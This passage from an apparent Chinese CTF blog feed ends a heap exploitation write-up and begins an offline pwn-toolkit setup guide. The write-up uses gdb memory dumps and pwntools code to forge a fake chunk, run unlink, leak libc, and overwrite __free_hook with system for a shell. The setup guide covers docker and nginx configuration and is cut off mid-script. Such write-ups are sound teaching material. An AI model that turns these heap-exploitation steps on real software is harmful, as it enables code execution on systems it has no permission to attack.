class="number">0x0000000000000000</span>	<span class="number">0x0000000000000101</span> #实际可以写部分</span><br><span class="line"><span class="number">0x5653ee7a51e0</span>:	<span class="number">0x00005653ee7a5168</span>	<span class="number">0x00005653ee7a5170</span></span><br><span class="line"><span class="number">0x5653ee7a51f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>这是我显示first_heap后的数据，0x5653ee7a51d0便是申请的0x108的chunk，我在这里伪造了一个chunk，fd和bk在0x5653ee7a51e0，然后通过溢出将下个chunk的pre_size改成我这个伪造的chunk大小<br>在看看相邻的堆块</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5653ee7a51c0</span></span><br><span class="line"><span class="number">0x5653ee7a51c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5653ee7a51d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000101</span> #伪造的chunk记为p</span><br><span class="line"><span class="number">0x5653ee7a51e0</span>:	<span class="number">0x00005653ee7a5168</span>	<span class="number">0x00005653ee7a5170</span></span><br><span class="line"><span class="number">0x5653ee7a51f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5220</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5230</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5240</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5260</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5270</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5280</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5290</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52d0</span>:	<span class="number">0x0000000000000100</span>	<span class="number">0x0000000000000100</span> #chunk5</span><br><span class="line"><span class="number">0x5653ee7a52e0</span>:	<span class="number">0x0000746567726174</span>	<span class="number">0x0000000000000000</span> #实际可以写部分</span><br><span class="line"><span class="number">0x5653ee7a52f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5300</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5310</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5320</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5330</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5340</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>这时候我remove(5)的话，会变成什么样呢？他会unlink(p)，然后将chunk5向前合并，不信试试看，这里数据需要精心构造，才能造成任意写的能力<br>remove(5)效果，变成了201，这是合并的效果，然后地址部分指向了libc部分的地址，如果我们能泄露这部分地址，就获得libc<br>还有个重点，我们的unlink过程没显示出来，我们分析下，unlink(p)做了啥<br>假设我们chunk4数据部分的地址为myptr<br>这里unlink(p)</p><ol><li>FD = ptr-0x18</li><li>BK = ptr-0x10</li><li>检测FD-&gt;bk==p? &amp;&amp; BK-&gt;fd == p?</li><li>检测成功过后</li><li>FD-&gt;bk &lt;=&gt; FD+0x18 &lt;=&gt; <em>(ptr-0x18+0x18) = BK = ptr-0x10 实际就是</em>ptr=ptr-0x10</li><li>BK-&gt;FD &lt;=&gt; BK+0x10 &lt;=&gt; <em>(ptr-0x10+0x10) = FD = ptr-0x18 实际就是</em>ptr=ptr-0x18<br>重点在第6行，我们将*ptr改成了ptr-0x18</li></ol><p>看ptr是哪里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">10</span>gx <span class="number">0x5577f976f080</span><span class="number">-0x80</span>+<span class="number">0x180</span></span><br><span class="line"><span class="number">0x5577f976f180</span>:	<span class="number">0x00005577f976f168</span>	<span class="number">0x0000000000000108</span></span><br><span class="line"><span class="number">0x5577f976f190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f1a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f1b0</span>:	<span class="number">0x00005577f976f170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br></pre></td></tr></table></figure><p>从整体来看</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5577f976f080</span></span><br><span class="line"><span class="number">0x5577f976f080</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005577f976f020</span></span><br><span class="line"><span class="number">0x5577f976f090</span>:	<span class="number">0x00005577f976f050</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f0a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0b0</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0x00005577f976f0e0</span></span><br><span class="line"><span class="number">0x5577f976f0c0</span>:	<span class="number">0x00005577f976f3e0</span>	<span class="number">0x0000000000000200</span></span><br><span class="line"><span class="number">0x5577f976f0d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0e0</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f110</span>:	<span class="number">0x00005577f976f130</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f120</span>:	<span class="number">0x00005577f976f2e0</span>	<span class="number">0x00000000000000f0</span></span><br><span class="line"><span class="number">0x5577f976f130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f170</span>:	<span class="number">0x0000557700000004</span>	<span class="number">0x00005577f976f1a0</span> #book4结构体</span><br><span class="line"><span class="number">0x5577f976f180</span>:	<span class="number">0x00005577f976f168</span>	<span class="number">0x0000000000000108</span> <span class="meta">#ptr，</span></span><br><span class="line"><span class="number">0x5577f976f190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f1a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f1b0</span>:	<span class="number">0x00005577f976f170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5577f976f1d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000201</span></span><br><span class="line"><span class="number">0x5577f976f1e0</span>:	<span class="number">0x00007f452ad38b78</span>	<span class="number">0x00007f452ad38b78</span></span><br><span class="line"><span class="number">0x5577f976f1f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>*ptr = ptr -0x18,也就是0x5577f976f180里的内容改为0x5577f976f168</p><p>这样，再次edit(4,payload)的话就可以修改从168开始的size以及name和description指针</p><p>合并效果</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5577f976f1c0</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5577f976f1d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000201</span></span><br><span class="line"><span class="number">0x5577f976f1e0</span>:	<span class="number">0x00007f452ad38b78</span>	<span class="number">0x00007f452ad38b78</span></span><br><span class="line"><span class="number">0x5577f976f1f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f220</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f230</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f240</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f260</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f270</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f280</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f290</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2d0</span>:	<span class="number">0x0000000000000100</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x5577f976f2e0</span>:	<span class="number">0x0000746567726174</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f300</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f310</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f320</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f330</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f340</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><h5 id="再次修改book4的结构体"><a href="#再次修改book4的结构体" class="headerlink" title="再次修改book4的结构体"></a>再次修改book4的结构体</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0x30</span>) + p64(<span class="number">4</span>) + p64(first_heap+<span class="number">0x40</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">edit(<span class="number">4</span>, p64(heap_base + <span class="number">0x1e0</span>))</span><br><span class="line">printf()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">content = io.recvline()</span><br><span class="line">io.info(content)</span><br><span class="line">libc_base = u64(content.strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3c4b7</span></span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">'system: 0x%x'</span> % system_addr)</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br></pre></td></tr></table></figure><p>0x30是他原来大小，4为id 4， 然后我将name和description指针都改为first_heap+0x40处，为什么是这里呢？因为，这里是book6的结构体部分的description部分指针，这样就获得了任意地址读写的能力，<br>第二次edit(4, p64(heap_base + 0x1e0))的时候就是将book6的description指针改成指向heap_base + 0x1e0处，为什么是这里，看上面<br>从整体来看</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5577f976f080</span></span><br><span class="line"><span class="number">0x5577f976f080</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005577f976f020</span></span><br><span class="line"><span class="number">0x5577f976f090</span>:	<span class="number">0x00005577f976f050</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f0a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0b0</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0x00005577f976f0e0</span></span><br><span class="line"><span class="number">0x5577f976f0c0</span>:	<span class="number">0x00005577f976f3e0</span>	<span class="number">0x0000000000000200</span></span><br><span class="line"><span class="number">0x5577f976f0d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0e0</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f110</span>:	<span class="number">0x00005577f976f130</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f120</span>:	<span class="number">0x00005577f976f2e0</span>	<span class="number">0x00000000000000f0</span></span><br><span class="line"><span class="number">0x5577f976f130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f170</span>:	<span class="number">0x0000557700000004</span>	<span class="number">0x00005577f976f1a0</span> </span><br><span class="line"><span class="number">0x5577f976f180</span>:	<span class="number">0x00005577f976f168</span>	<span class="number">0x0000000000000108</span> </span><br><span class="line"><span class="number">0x5577f976f190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f1a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f1b0</span>:	<span class="number">0x00005577f976f170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5577f976f1d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000201</span></span><br><span class="line"><span class="number">0x5577f976f1e0</span>:	<span class="number">0x00007f452ad38b78</span>	<span class="number">0x00007f452ad38b78</span> <span class="meta">#libc地址</span></span><br><span class="line"><span class="number">0x5577f976f1f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>这样就泄露了libc地址，那个固定偏移，也是利用vmmap查看，然后相减获得的</p><h5 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(free_hook) + p64(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">edit(<span class="number">6</span>, p64(system_addr))</span><br><span class="line">io.success(<span class="string">'first_heap: 0x%x'</span> % first_heap)</span><br><span class="line">remove(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br></pre></td></tr></table></figure><ol><li>edit(4,payload)这里将book6的description指针指向free_hook</li><li>然后edit是改成system地址，最后调用一次free就成了<h2 id="课后小知识总结"><a href="#课后小知识总结" class="headerlink" title="课后小知识总结"></a>课后小知识总结</h2></li><li>在gdb中用find查找字符串，可以获得指定位置</li><li>堆块会复用，就是free过后的小堆块，在再次malloc后会用相同的堆块</li><li>在计算的时候可以以一个为基地址，这样好计算</li><li>vmmap获得libc地址后，在相减获得固定偏移，适用于smallbin第一次free的chunk和mmap申请的堆块</li><li>具体情况具体分析，不要照搬照抄原版exp，有些是要改的，大佬们觉得简单可能就没注释了<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></li><li>题目不难，但自己做确实有点难度，研究了好久</li><li>写这个入门的文章也挺难的，要自己懂点，有人带就好点了，希望有师傅可以带带我</li><li>要开学了，另一道题目下次在研究了，off-by-one另一道题目</li><li>这道题同时学习了unlink跟off-by-one</li><li>我一定会出这个系列的文章的，坚持就是胜利(我对我自己说的，hh)</li></ol><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/1a1c1b4a/">https://noone-hub.github.io/posts/1a1c1b4a/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>论菜鸡pwn手如何在无网环境（ps：类似国赛)下生存</title>
    <url>/posts/9f664865/</url>
    <content><![CDATA[<p>本文首发于先知社区</p><h1 id="论菜鸡pwn手如何在无网环境（ps：类似国赛-下生存"><a href="#论菜鸡pwn手如何在无网环境（ps：类似国赛-下生存" class="headerlink" title="论菜鸡pwn手如何在无网环境（ps：类似国赛)下生存"></a>论菜鸡pwn手如何在无网环境（ps：类似国赛)下生存</h1><p>引言：在打完一次无网环境后，觉得没网环境实在难受，查个libc都没得查。。没准备好，那时碰巧我下了ctf-challenge,在那里碰巧弄到了libc，可能有人喜欢用libc-searcher那个py版本的项目，我不怎么喜欢，用那个导入库查找感觉较慢，还是喜欢手动泄露后到网页查找，于是有了这篇文章</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h2 id="pwntools安装"><a href="#pwntools安装" class="headerlink" title="pwntools安装"></a>pwntools安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><p>出错自己解决啊，那些个错误都查得到</p><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gem install one_gadget</span><br></pre></td></tr></table></figure><h2 id="gdb配置"><a href="#gdb配置" class="headerlink" title="gdb配置"></a>gdb配置</h2><p>我个人觉得，peda和pwndbg必备，gef也可以用上，随你<br>自己写了个脚本，很渣，自选用不用<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3FxMTI3MDI4NzI0NS9nZGItcGx1Z2lucw==" title="https://github.com/qq1270287245/gdb-plugins">项目地址<i class="fa fa-external-link"></i></span><br>三个插件一起用会冲突，一部分功能失效，建议注释掉.gdbinit里的gef部分</p><h2 id="welpwn"><a href="#welpwn" class="headerlink" title="welpwn"></a>welpwn</h2><p>这个项目是国防科技大学弄的，挺好用的，最主要是能加载libc</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/welpwn</span><br></pre></td></tr></table></figure><p>到项目目录下然后</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>用法你可以看他项目里的介绍</p><h2 id="ctf-wiki本地搭建"><a href="#ctf-wiki本地搭建" class="headerlink" title="ctf-wiki本地搭建"></a>ctf-wiki本地搭建</h2><p>作为一个不是啥都熟的选手，ctf-wiki还是必备的，打比赛的时候查查exp，查查用法什么都好</p><h3 id="首先安装docker"><a href="#首先安装docker" class="headerlink" title="首先安装docker"></a>首先安装docker</h3><p>这个不讲了</p><h3 id="docker-pull镜像"><a href="#docker-pull镜像" class="headerlink" title="docker pull镜像"></a>docker pull镜像</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search ctf  <span class="comment">#先查找镜像，镜像名知道可以不查找</span></span><br><span class="line">docker pull ctfwiki/ctf-wiki <span class="comment">#pull ctfwiki镜像</span></span><br><span class="line">docker run -d --name=ctf-wiki -p 4100:80 ctfwiki/ctf-wiki <span class="comment">#-d参数为后台运行，--name为名称 -p为端口映射 4100是本地端口，80是docker端口</span></span><br></pre></td></tr></table></figure><h2 id="部署libc-database"><a href="#部署libc-database" class="headerlink" title="部署libc-database"></a>部署libc-database</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull blukat29/libc</span><br><span class="line">docker run -p 4101:80 -d blukat29/libc</span><br></pre></td></tr></table></figure><p>配置文件目录/etc/nginx/conf.d/nginx.conf<br>启动端口在4101,这里有个小问题，就是无法下载，解决方法，替换nginx的配置文件为如下</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">@app</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> <span class="variable">@app</span> &#123;</span><br><span class="line">        <span class="attribute">include</span> uwsgi_params;</span><br><span class="line">        <span class="attribute">uwsgi_param</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">uwsgi_param</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        <span class="attribute">uwsgi_param</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        <span class="attribute">uwsgi_pass</span> unix:///tmp/uwsgi.sock;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> /static &#123;</span><br><span class="line">        <span class="attribute">alias</span> /app/static;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> /d &#123;</span><br><span class="line">        <span class="attribute">alias</span> /libc-database/db;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ \.symbols$</span> &#123;</span><br><span class="line">            <span class="attribute">default_type</span> text/plain;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最主要是</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> /d &#123;</span><br><span class="line">    <span class="attribute">alias</span> /libc-database/db;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \.symbols$</span> &#123;</span><br><span class="line">        <span class="attribute">default_type</span> text/plain;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后发觉每次重启都会他配置文件都会重置，研究下了他docker里的东西，发觉是entrypoint.sh影响了，所以修改下entrypoint.sh就行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /usr/bin/env bash</span></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"><span class="comment"># Get the maximum upload file size for Nginx, default to 0: unlimited</span></span><br><span class="line">USE_NGINX_MAX_UPLOAD=<span class="variable">$&#123;NGINX_MAX_UPLOAD:-0&#125;</span></span><br><span class="line"><span class="comment"># Generate Nginx config for maximum upload file size</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"client_max_body_size <span class="variable">$USE_NGINX_MAX_UPLOAD</span>;"</span> &gt; /etc/nginx/conf.d/upload.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the number of workers for Nginx, default to 1</span></span><br><span class="line">USE_NGINX_WORKER_PROCESSES=<span class="variable">$&#123;NGINX_WORKER_PROCESSES:-1&#125;</span></span><br><span class="line"><span class="comment"># Modify the number of worker processes in Nginx config</span></span><br><span class="line">sed -i <span class="string">"/worker_processes\s/c\worker_processes <span class="variable">$&#123;USE_NGINX_WORKER_PROCESSES&#125;</span>;"</span> /etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the URL for static files from the environment variable</span></span><br><span class="line">USE_STATIC_URL=<span class="variable">$&#123;STATIC_URL:-'/static'&#125;</span></span><br><span class="line"><span class="comment"># Get the absolute path of the static files from the environment variable</span></span><br><span class="line">USE_STATIC_PATH=<span class="variable">$&#123;STATIC_PATH:-'/app/static'&#125;</span></span><br><span class="line"><span class="comment"># Get the listen port for Nginx, default to 80</span></span><br><span class="line">USE_LISTEN_PORT=<span class="variable">$&#123;LISTEN_PORT:-80&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate Nginx config first part using the environment variables</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"server &#123;</span></span><br><span class="line"><span class="string">    listen 80;</span></span><br><span class="line"><span class="string">    location / &#123;</span></span><br><span class="line"><span class="string">        try_files \$uri @app;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    location @app &#123;</span></span><br><span class="line"><span class="string">        include uwsgi_params;</span></span><br><span class="line"><span class="string">        uwsgi_param Host \$host;</span></span><br><span class="line"><span class="string">        uwsgi_param X-Real-IP \$remote_addr;</span></span><br><span class="line"><span class="string">        uwsgi_param X-Forwarded-For \$proxy_add_x_forwarded_for;</span></span><br><span class="line"><span class="string">        uwsgi_pass unix:///tmp/uwsgi.sock;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    location /static &#123;</span></span><br><span class="line"><span class="string">        alias /app/static;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    location /d &#123;</span></span><br><span class="line"><span class="string">        alias /libc-database/db;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        location ~ \.symbols$ &#123;</span></span><br><span class="line"><span class="string">            default_type text/plain;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;"</span> &gt; /etc/nginx/conf.d/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># If STATIC_INDEX is 1, serve / with /static/index.html directly (or the static URL configured)</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$STATIC_INDEX</span> == 1 ]] ; <span class="keyword">then</span> </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"    location = / &#123;</span></span><br><span class="line"><span class="string">        index <span class="variable">$USE_STATIC_URL</span>/index.html;</span></span><br><span class="line"><span class="string">    &#125;"</span> &gt;&gt; /etc/nginx/conf.d/nginx.conf</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># Finish the Nginx config file</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&#125;"</span> &gt;&gt; /etc/nginx/conf.d/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> <span 